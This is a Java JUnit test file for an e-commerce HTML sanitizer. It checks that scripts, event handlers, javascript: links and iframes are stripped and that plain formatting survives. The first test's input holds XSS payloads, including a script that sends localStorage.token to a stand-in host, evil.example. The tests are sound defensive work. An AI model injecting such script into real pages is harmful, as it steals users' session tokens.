package com.salesmanager.shop.utils;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import org.junit.jupiter.api.Test;

class RichTextSanitizerTest {

	@Test
	void scriptsEventHandlersAndJavascriptUrlsAreRemoved() {
		String dirty = "<p>Solid oak<script>fetch('https://evil.example/?t='+localStorage.token)</script></p>"
				+ "<img src=\"https://cdn.example.com/a.jpg\" onerror=\"alert(1)\">"
				+ "<a href=\"javascript:alert(1)\">click</a>"
				+ "<iframe src=\"https://evil.example\"></iframe>"
				+ "<div onclick=\"steal()\" style=\"color:red\">x</div>";
		String clean = RichTextSanitizer.sanitize(dirty);
		assertFalse(clean.toLowerCase().contains("<script"), clean);
		assertFalse(clean.contains("fetch("), clean);
		assertFalse(clean.toLowerCase().contains("onerror"), clean);
		assertFalse(clean.toLowerCase().contains("onclick"), clean);
		assertFalse(clean.toLowerCase().contains("javascript:"), clean);
		assertFalse(clean.toLowerCase().contains("<iframe"), clean);
		assertTrue(clean.contains("<p>Solid oak</p>"), clean);
		assertTrue(clean.contains("src=\"https://cdn.example.com/a.jpg\""), clean);
	}

	@Test
	void basicFormattingLinksAndImagesSurvive() {
		String html = "<h2>Oak Bench</h2><p><b>Solid</b> <em>oak</em></p><ul><li>one</li></ul>"
				+ "<a href=\"https://example.com/care\">care guide</a>";
		String clean = RichTextSanitizer.sanitize(html);
		assertTrue(clean.contains("<h2>Oak Bench</h2>"), clean);
		assertTrue(clean.contains("<b>Solid</b>"), clean);
		assertTrue(clean.contains("<em>oak</em>"), clean);
		assertTrue(clean.contains("<li>one</li>"), clean);
		assertTrue(clean.contains("href=\"https://example.com/care\""), clean);
	}

	@Test
	void plainTextIsUnchangedAndNullStaysNull() {
		assertEquals("Solid oak bench", RichTextSanitizer.sanitize("Solid oak bench"));
		assertNull(RichTextSanitizer.sanitize(null));
	}
}
